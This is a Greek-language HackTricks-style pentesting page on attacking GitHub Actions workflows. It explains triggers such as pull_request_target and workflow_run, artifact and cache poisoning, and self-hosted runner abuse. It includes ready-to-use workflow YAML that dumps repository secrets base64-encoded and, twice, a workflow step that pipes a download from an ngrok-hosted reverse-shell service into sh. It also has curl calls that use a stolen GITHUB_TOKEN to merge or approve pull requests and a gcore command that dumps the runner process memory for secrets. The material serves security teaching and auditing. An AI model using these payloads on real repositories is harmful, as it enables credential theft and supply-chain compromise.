# Κατάχρηση Github Actions

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Δείτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε hacking tricks υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.

</details>
{% endhint %}

## Βασικές Πληροφορίες

Σε αυτή τη σελίδα θα βρείτε:

* Μια **περίληψη όλων των επιπτώσεων** από έναν επιτιθέμενο που καταφέρνει να αποκτήσει πρόσβαση σε ένα Github Action
* Διάφορους τρόπους για να **αποκτήσετε πρόσβαση σε ένα action**:
* Έχοντας **δικαιώματα** για να δημιουργήσετε το action
* Κατάχρηση **triggers που σχετίζονται με pull request**
* Κατάχρηση **άλλων τεχνικών εξωτερικής πρόσβασης**
* **Pivoting** από ένα ήδη παραβιασμένο αποθετήριο
* Τέλος, μια ενότητα για **τεχνικές μετά την εκμετάλλευση για κατάχρηση ενός action από μέσα** (προκαλώντας τις αναφερόμενες επιπτώσεις)

## Περίληψη Επιπτώσεων

Για μια εισαγωγή σχετικά με [**Github Actions δείτε τις βασικές πληροφορίες**](../basic-github-information.md#github-actions).

Σε περίπτωση που μπορείτε να **εκτελέσετε αυθαίρετα Github actions/εισάγετε κώδικα** σε ένα **αποθετήριο**, θα μπορούσατε να:

* **Κλέψετε** τα **μυστικά** από αυτό το αποθετήριο/οργάνωση.
* Αν μπορείτε μόνο να εισάγετε, μπορείτε να κλέψετε ό,τι είναι ήδη παρόν στο workflow.
* Καταχραστείτε **δικαιώματα αποθετηρίου** για πρόσβαση σε άλλες πλατφόρμες όπως AWS και GCP.
* **Εκτελέσετε κώδικα σε προσαρμοσμένους workers** (αν χρησιμοποιούνται προσαρμοσμένοι workers) και προσπαθήστε να pivot από εκεί.
* **Υπερκαλύψετε** τον κώδικα του αποθετηρίου.
* Αυτό εξαρτάται από τα δικαιώματα του `GITHUB_TOKEN` (αν υπάρχει).
* **Παραβιάσετε** **αναπτύξεις** και άλλα **artifacts**.
* Αν ο κώδικας αναπτύσσει ή αποθηκεύει κάτι, θα μπορούσατε να το τροποποιήσετε και να αποκτήσετε περαιτέρω πρόσβαση.

## GITHUB\_TOKEN

Αυτό το "**μυστικό**" (προερχόμενο από `${{ secrets.GITHUB_TOKEN }}` και `${{ github.token }}`) δίνεται όταν ο διαχειριστής ενεργοποιεί αυτή την επιλογή:

<figure><img src="../../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

Αυτό το token είναι το ίδιο που θα χρησιμοποιήσει μια **Github Application**, οπότε μπορεί να έχει πρόσβαση στα ίδια endpoints: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Η Github θα πρέπει να κυκλοφορήσει ένα [**flow**](https://github.com/github/roadmap/issues/74) που **επιτρέπει διασταυρούμενη πρόσβαση αποθετηρίων** εντός του GitHub, ώστε ένα αποθετήριο να μπορεί να έχει πρόσβαση σε άλλα εσωτερικά αποθετήρια χρησιμοποιώντας το `GITHUB_TOKEN`.
{% endhint %}

Μπορείτε να δείτε τα πιθανά **δικαιώματα** αυτού του token στο: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Σημειώστε ότι το token **λήγει μετά την ολοκλήρωση της εργασίας**.\
Αυτά τα tokens μοιάζουν με αυτό: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Μερικά ενδιαφέροντα πράγματα που μπορείτε να κάνετε με αυτό το token:

{% tabs %}
{% tab title="Merge PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="Έγκριση PR" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="Create PR" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Σημειώστε ότι σε αρκετές περιπτώσεις θα μπορείτε να βρείτε **github user tokens μέσα στα Github Actions envs ή στα secrets**. Αυτά τα tokens μπορεί να σας δώσουν περισσότερα προνόμια πάνω στο repository και την οργάνωση.
{% endhint %}

<details>

<summary>Λίστα των secrets στην έξοδο του Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Απόκτηση reverse shell με secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Είναι δυνατό να ελέγξετε τα δικαιώματα που δίνονται σε ένα Github Token σε αποθετήρια άλλων χρηστών **ελέγχοντας τα logs** των actions:

<figure><img src="../../../.gitbook/assets/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## Επιτρεπόμενη Εκτέλεση

{% hint style="info" %}
Αυτός θα ήταν ο ευκολότερος τρόπος να παραβιάσετε τα Github actions, καθώς αυτή η περίπτωση υποθέτει ότι έχετε πρόσβαση για **δημιουργία νέου αποθετηρίου στον οργανισμό**, ή έχετε **δικαιώματα εγγραφής σε ένα αποθετήριο**.

Αν βρίσκεστε σε αυτό το σενάριο, μπορείτε απλά να ελέγξετε τις [Post Exploitation techniques](./#post-exploitation-techniques-from-inside-an-action).
{% endhint %}

### Εκτέλεση από Δημιουργία Αποθετηρίου

Σε περίπτωση που τα μέλη ενός οργανισμού μπορούν να **δημιουργήσουν νέα αποθετήρια** και μπορείτε να εκτελέσετε github actions, μπορείτε να **δημιουργήσετε ένα νέο αποθετήριο και να κλέψετε τα secrets που έχουν οριστεί σε επίπεδο οργανισμού**.

### Εκτέλεση από Νέο Κλάδο

Αν μπορείτε να **δημιουργήσετε έναν νέο κλάδο σε ένα αποθετήριο που ήδη περιέχει ένα Github Action** διαμορφωμένο, μπορείτε να το **τροποποιήσετε**, να **ανεβάσετε** το περιεχόμενο και στη συνέχεια να **εκτελέσετε αυτήν την ενέργεια από τον νέο κλάδο**. Με αυτόν τον τρόπο μπορείτε να **εξάγετε secrets σε επίπεδο αποθετηρίου και οργανισμού** (αλλά πρέπει να γνωρίζετε πώς ονομάζονται).

Μπορείτε να κάνετε την τροποποιημένη ενέργεια εκτελέσιμη **χειροκίνητα**, όταν δημιουργείται ένα **PR** ή όταν **προωθείται κάποιος κώδικας** (ανάλογα με το πόσο θορυβώδεις θέλετε να είστε):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Forked Execution

{% hint style="info" %}
Υπάρχουν διαφορετικοί ενεργοποιητές που θα μπορούσαν να επιτρέψουν σε έναν επιτιθέμενο να **εκτελέσει ένα Github Action ενός άλλου αποθετηρίου**. Εάν αυτές οι ενεργοποιήσιμες ενέργειες είναι κακώς διαμορφωμένες, ένας επιτιθέμενος θα μπορούσε να τις παραβιάσει.
{% endhint %}

### `pull_request`

Ο ενεργοποιητής ροής εργασίας **`pull_request`** θα εκτελέσει τη ροή εργασίας κάθε φορά που λαμβάνεται ένα pull request με ορισμένες εξαιρέσεις: από προεπιλογή, εάν είναι η **πρώτη φορά** που **συνεργάζεστε**, κάποιος **διαχειριστής** θα χρειαστεί να **εγκρίνει** την **εκτέλεση** της ροής εργασίας:

<figure><img src="../../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Δεδομένου ότι ο **προεπιλεγμένος περιορισμός** είναι για **πρώτους-χρόνους** συνεισφέροντες, θα μπορούσατε να συνεισφέρετε **διορθώνοντας ένα έγκυρο σφάλμα/τυπογραφικό λάθος** και στη συνέχεια να στείλετε **άλλα PRs για να καταχραστείτε τα νέα σας προνόμια `pull_request`**.

**Το δοκίμασα και δεν λειτουργεί**: ~~Μια άλλη επιλογή θα ήταν να δημιουργήσετε έναν λογαριασμό με το όνομα κάποιου που συνεισέφερε στο έργο και διέγραψε τον λογαριασμό του.~~
{% endhint %}

Επιπλέον, από προεπιλογή **αποτρέπει δικαιώματα εγγραφής** και **πρόσβαση σε μυστικά** στο αποθετήριο στόχο όπως αναφέρεται στα [**έγγραφα**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> Με την εξαίρεση του `GITHUB_TOKEN`, **τα μυστικά δεν μεταβιβάζονται στον εκτελεστή** όταν μια ροή εργασίας ενεργοποιείται από ένα **forked** αποθετήριο. Το **`GITHUB_TOKEN` έχει δικαιώματα μόνο για ανάγνωση** σε pull requests **από forked αποθετήρια**.

Ένας επιτιθέμενος θα μπορούσε να τροποποιήσει τον ορισμό του Github Action για να εκτελέσει αυθαίρετα πράγματα και να προσθέσει αυθαίρετες ενέργειες. Ωστόσο, δεν θα μπορέσει να κλέψει μυστικά ή να αντικαταστήσει το αποθετήριο λόγω των προαναφερθέντων περιορισμών.

{% hint style="danger" %}
**Ναι, αν ο επιτιθέμενος αλλάξει στο PR το github action που θα ενεργοποιηθεί, το δικό του Github Action θα είναι αυτό που θα χρησιμοποιηθεί και όχι αυτό από το αρχικό αποθετήριο!**
{% endhint %}

Δεδομένου ότι ο επιτιθέμενος ελέγχει επίσης τον κώδικα που εκτελείται, ακόμα και αν δεν υπάρχουν μυστικά ή δικαιώματα εγγραφής στο `GITHUB_TOKEN`, ένας επιτιθέμενος θα μπορούσε για παράδειγμα να **ανεβάσει κακόβουλα αρχεία**.

### **`pull_request_target`**

Ο ενεργοποιητής ροής εργασίας **`pull_request_target`** έχει **δικαιώματα εγγραφής** στο αποθετήριο στόχο και **πρόσβαση σε μυστικά** (και δεν ζητά άδεια).

Σημειώστε ότι ο ενεργοποιητής ροής εργασίας **`pull_request_target`** **εκτελείται στο βασικό πλαίσιο** και όχι σε αυτό που δίνεται από το PR (για να **μην εκτελείται μη αξιόπιστος κώδικας**). Για περισσότερες πληροφορίες σχετικά με το `pull_request_target` [**ελέγξτε τα έγγραφα**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
Επιπλέον, για περισσότερες πληροφορίες σχετικά με αυτήν την συγκεκριμένη επικίνδυνη χρήση, ελέγξτε αυτήν την [**ανάρτηση στο blog του github**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Μπορεί να φαίνεται ότι επειδή η **εκτελούμενη ροή εργασίας** είναι αυτή που ορίζεται στη **βάση** και **όχι στο PR** είναι **ασφαλές** να χρησιμοποιήσετε το **`pull_request_target`**, αλλά υπάρχουν **μερικές περιπτώσεις όπου δεν είναι**.

Και αυτή θα έχει **πρόσβαση σε μυστικά**.

### `workflow_run`

Ο ενεργοποιητής [**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) επιτρέπει την εκτέλεση μιας ροής εργασίας από μια άλλη όταν είναι `completed`, `requested` ή `in_progress`.

Σε αυτό το παράδειγμα, μια ροή εργασίας είναι διαμορφωμένη να εκτελείται μετά την ολοκλήρωση της ξεχωριστής ροής εργασίας "Run Tests":
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Επιπλέον, σύμφωνα με τα έγγραφα: Το workflow που ξεκινά από το `workflow_run` event μπορεί να **έχει πρόσβαση σε secrets και write tokens, ακόμα και αν το προηγούμενο workflow δεν είχε**.

Αυτό το είδος workflow μπορεί να δεχτεί επίθεση αν **εξαρτάται** από ένα **workflow** που μπορεί να **ενεργοποιηθεί** από έναν εξωτερικό χρήστη μέσω **`pull_request`** ή **`pull_request_target`**. Μερικά ευάλωτα παραδείγματα μπορούν να βρεθούν [**σε αυτό το blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** Το πρώτο αποτελείται από το **`workflow_run`** που ενεργοποιείται κατεβάζοντας τον κώδικα του επιτιθέμενου: `${{ github.event.pull_request.head.sha }}`\
Το δεύτερο αποτελείται από τη **μεταφορά** ενός **artifact** από τον **μη αξιόπιστο** κώδικα στο **`workflow_run`** workflow και τη χρήση του περιεχομένου αυτού του artifact με τρόπο που το καθιστά **ευάλωτο σε RCE**.

### `workflow_call`

TODO

TODO: Ελέγξτε αν όταν εκτελείται από ένα pull\_request ο χρησιμοποιούμενος/κατεβασμένος κώδικας είναι από το origin ή από το forked PR

## Κατάχρηση Εκτέλεσης από Forked

Έχουμε αναφέρει όλους τους τρόπους με τους οποίους ένας εξωτερικός επιτιθέμενος θα μπορούσε να καταφέρει να εκτελέσει ένα github workflow, τώρα ας δούμε πώς αυτές οι εκτελέσεις, αν είναι κακώς διαμορφωμένες, θα μπορούσαν να καταχραστούν:

### Εκτέλεση μη αξιόπιστου checkout

Στην περίπτωση του **`pull_request`,** το workflow θα εκτελεστεί στο **context του PR** (οπότε θα εκτελέσει τον **κακόβουλο κώδικα του PR**), αλλά κάποιος πρέπει να το **εξουσιοδοτήσει πρώτα** και θα εκτελεστεί με κάποιους [περιορισμούς](./#pull\_request).

Σε περίπτωση ενός workflow που χρησιμοποιεί **`pull_request_target` ή `workflow_run`** που εξαρτάται από ένα workflow που μπορεί να ενεργοποιηθεί από **`pull_request_target` ή `pull_request`** ο κώδικας από το αρχικό repo θα εκτελεστεί, οπότε ο **επιτιθέμενος δεν μπορεί να ελέγξει τον εκτελούμενο κώδικα**.

{% hint style="danger" %}
Ωστόσο, αν η **ενέργεια** έχει ένα **ρητό PR checkout** που θα **πάρει τον κώδικα από το PR** (και όχι από τη βάση), θα χρησιμοποιήσει τον ελεγχόμενο από τον επιτιθέμενο κώδικα. Για παράδειγμα (ελέγξτε τη γραμμή 12 όπου κατεβαίνει ο κώδικας του PR):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

Ο πιθανώς **μη αξιόπιστος κώδικας εκτελείται κατά τη διάρκεια του `npm install` ή `npm build`** καθώς τα build scripts και τα αναφερόμενα **packages ελέγχονται από τον συγγραφέα του PR**.

{% hint style="warning" %}
Ένα github dork για αναζήτηση ευάλωτων ενεργειών είναι: `event.pull_request pull_request_target extension:yml` ωστόσο, υπάρχουν διαφορετικοί τρόποι να διαμορφωθούν οι εργασίες για να εκτελούνται με ασφάλεια ακόμα και αν η ενέργεια είναι διαμορφωμένη ανασφαλώς (όπως η χρήση συνθηκών σχετικά με το ποιος είναι ο ηθοποιός που δημιουργεί το PR).
{% endhint %}

### Ενέσεις Script στο Context <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Σημειώστε ότι υπάρχουν ορισμένα [**github contexts**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) των οποίων οι τιμές **ελέγχονται** από τον **χρήστη** που δημιουργεί το PR. Αν η github action χρησιμοποιεί αυτά τα **δεδομένα για να εκτελέσει κάτι**, θα μπορούσε να οδηγήσει σε **αυθαίρετη εκτέλεση κώδικα:**

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **GITHUB\_ENV Script Injection** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Από τα έγγραφα: Μπορείτε να κάνετε μια **μεταβλητή περιβάλλοντος διαθέσιμη σε οποιοδήποτε επόμενο βήμα** σε μια εργασία workflow ορίζοντας ή ενημερώνοντας τη μεταβλητή περιβάλλοντος και γράφοντας αυτήν στο αρχείο περιβάλλοντος **`GITHUB_ENV`**.

Αν ένας επιτιθέμενος μπορούσε να **εισάγει οποιαδήποτε τιμή** μέσα σε αυτήν τη **μεταβλητή περιβάλλοντος**, θα μπορούσε να εισάγει μεταβλητές περιβάλλοντος που θα μπορούσαν να εκτελέσουν κώδικα στα επόμενα βήματα όπως **LD\_PRELOAD** ή **NODE\_OPTIONS**.

Για παράδειγμα ([**αυτό**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) και [**αυτό**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), φανταστείτε ένα workflow που εμπιστεύεται ένα ανεβασμένο artifact για να αποθηκεύσει το περιεχόμενό του μέσα στη μεταβλητή περιβάλλοντος **`GITHUB_ENV`**. Ένας επιτιθέμενος θα μπορούσε να ανεβάσει κάτι τέτοιο για να το παραβιάσει:

<figure><img src="../../../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>

### Ευάλωτες Τρίτες Ενέργειες Github

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Όπως αναφέρεται σε [**αυτό το blog post**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), αυτή η Github Action επιτρέπει την πρόσβαση σε artifacts από διαφορετικά workflows και ακόμη και αποθετήρια.

Το πρόβλημα είναι ότι αν η παράμετρος **`path`** δεν έχει οριστεί, το artifact εξάγεται στον τρέχοντα κατάλογο και μπορεί να αντικαταστήσει αρχεία που θα μπορούσαν να χρησιμοποιηθούν ή ακόμη και να εκτελεστούν στο workflow. Επομένως, αν το Artifact είναι ευάλωτο, ένας επιτιθέμενος θα μπορούσε να το καταχραστεί για να παραβιάσει άλλα workflows που εμπιστεύονται το Artifact.

Παράδειγμα ευάλωτου workflow:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Αυτό θα μπορούσε να δεχτεί επίθεση με αυτή τη ροή εργασίας:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## Άλλη Εξωτερική Πρόσβαση

### Απαγωγή Διαγραμμένου Namespace Repo

Αν ένας λογαριασμός αλλάξει το όνομά του, ένας άλλος χρήστης θα μπορούσε να καταχωρήσει έναν λογαριασμό με αυτό το όνομα μετά από κάποιο χρονικό διάστημα. Αν ένα αποθετήριο είχε **λιγότερα από 100 αστέρια πριν από την αλλαγή του ονόματος**, το Github θα επιτρέψει στον νέο καταχωρημένο χρήστη με το ίδιο όνομα να δημιουργήσει ένα **αποθετήριο με το ίδιο όνομα** με αυτό που διαγράφηκε.

{% hint style="danger" %}
Έτσι, αν μια ενέργεια χρησιμοποιεί ένα αποθετήριο από έναν ανύπαρκτο λογαριασμό, είναι ακόμα πιθανό ότι ένας επιτιθέμενος θα μπορούσε να δημιουργήσει αυτόν τον λογαριασμό και να θέσει σε κίνδυνο την ενέργεια.
{% endhint %}

Αν άλλα αποθετήρια χρησιμοποιούσαν **εξαρτήσεις από αυτά τα αποθετήρια χρήστη**, ένας επιτιθέμενος θα μπορούσε να τα απαγάγει. Εδώ έχετε μια πιο ολοκληρωμένη εξήγηση: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Repo Pivoting

{% hint style="info" %}
Σε αυτή την ενότητα θα μιλήσουμε για τεχνικές που θα επιτρέψουν να **μετακινηθούμε από ένα repo σε άλλο** υποθέτοντας ότι έχουμε κάποιο είδος πρόσβασης στο πρώτο (ελέγξτε την προηγούμενη ενότητα).
{% endhint %}

### Δηλητηρίαση Cache

Μια cache διατηρείται μεταξύ **εκτελέσεων workflow στο ίδιο branch**. Αυτό σημαίνει ότι αν ένας επιτιθέμενος **θέσει σε κίνδυνο** ένα **πακέτο** που στη συνέχεια αποθηκεύεται στην cache και **κατεβάζεται** και εκτελείται από ένα **πιο προνομιούχο** workflow, θα μπορέσει να **θέσει σε κίνδυνο** και αυτό το workflow.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Δηλητηρίαση Αρτεφάκτων

Τα workflows θα μπορούσαν να χρησιμοποιούν **αρτεφάκτα από άλλα workflows και ακόμα και αποθετήρια**, αν ένας επιτιθέμενος καταφέρει να **θέσει σε κίνδυνο** το Github Action που **ανεβάζει ένα αρτεφάκτο** που στη συνέχεια χρησιμοποιείται από άλλο workflow, θα μπορούσε να **θέσει σε κίνδυνο τα άλλα workflows**:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## Μετα-εκμετάλλευση από μια Ενέργεια

### Πρόσβαση σε AWS και GCP μέσω OIDC

Ελέγξτε τις ακόλουθες σελίδες:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Πρόσβαση σε μυστικά <a href="#accessing-secrets" id="accessing-secrets"></a>

Αν εισάγετε περιεχόμενο σε ένα script, είναι ενδιαφέρον να γνωρίζετε πώς μπορείτε να έχετε πρόσβαση σε μυστικά:

* Αν το μυστικό ή το token έχει οριστεί σε μια **μεταβλητή περιβάλλοντος**, μπορεί να προσπελαστεί απευθείας μέσω του περιβάλλοντος χρησιμοποιώντας **`printenv`**.

<details>

<summary>Λίστα μυστικών στην έξοδο του Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Λάβετε αντίστροφο κέλυφος με μυστικά</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* Αν το μυστικό χρησιμοποιείται **άμεσα σε μια έκφραση**, το παραγόμενο script κελύφους αποθηκεύεται **στον δίσκο** και είναι προσβάσιμο.
* ```bash
cat /home/runner/work/_temp/*
```
* Για μια JavaScript actions τα μυστικά αποστέλλονται μέσω μεταβλητών περιβάλλοντος
* ```bash
ps axe | grep node
```
* Για μια **custom action**, ο κίνδυνος μπορεί να διαφέρει ανάλογα με το πώς ένα πρόγραμμα χρησιμοποιεί το μυστικό που έλαβε από το **argument**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Abusing Self-hosted runners

Ο τρόπος για να βρείτε ποιες **Github Actions εκτελούνται σε μη-github υποδομές** είναι να αναζητήσετε **`runs-on: self-hosted`** στο αρχείο ρύθμισης της Github Action yaml.

Οι **Self-hosted** runners μπορεί να έχουν πρόσβαση σε **επιπλέον ευαίσθητες πληροφορίες**, σε άλλα **συστήματα δικτύου** (ευάλωτα endpoints στο δίκτυο; metadata service;) ή, ακόμα και αν είναι απομονωμένα και καταστρέφονται, **περισσότερες από μία actions μπορεί να εκτελούνται ταυτόχρονα** και η κακόβουλη μπορεί να **κλέψει τα μυστικά** της άλλης.

Στους self-hosted runners είναι επίσης δυνατό να αποκτήσετε τα **μυστικά από τη διαδικασία \_Runner.Listener\_\*\* η οποία θα περιέχει όλα τα μυστικά των workflows σε οποιοδήποτε βήμα με την απόρριψη της μνήμης της:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

Check [**this post for more information**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker Images Registry

Είναι δυνατό να δημιουργηθούν Github actions που θα **δημιουργούν και αποθηκεύουν μια εικόνα Docker μέσα στο Github**.\
Ένα παράδειγμα μπορεί να βρεθεί στο παρακάτω αναπτυσσόμενο:

<details>

<summary>Github Action Build &#x26; Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Όπως μπορείτε να δείτε στον προηγούμενο κώδικα, το Github registry φιλοξενείται στο **`ghcr.io`**.

Ένας χρήστης με δικαιώματα ανάγνωσης στο αποθετήριο θα μπορεί να κατεβάσει την εικόνα Docker χρησιμοποιώντας ένα προσωπικό διακριτικό πρόσβασης:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Then, the user could search for **leaked secrets in the Docker image layers:**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Ευαίσθητες πληροφορίες στα logs του Github Actions

Ακόμα και αν το **Github** προσπαθεί να **εντοπίσει μυστικές τιμές** στα logs των actions και να **αποφύγει την εμφάνισή** τους, **άλλα ευαίσθητα δεδομένα** που μπορεί να έχουν δημιουργηθεί κατά την εκτέλεση της action δεν θα κρυφτούν. Για παράδειγμα, ένα JWT υπογεγραμμένο με μια μυστική τιμή δεν θα κρυφτεί εκτός αν είναι [συγκεκριμένα ρυθμισμένο](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Κάλυψη των Ιχνών σας

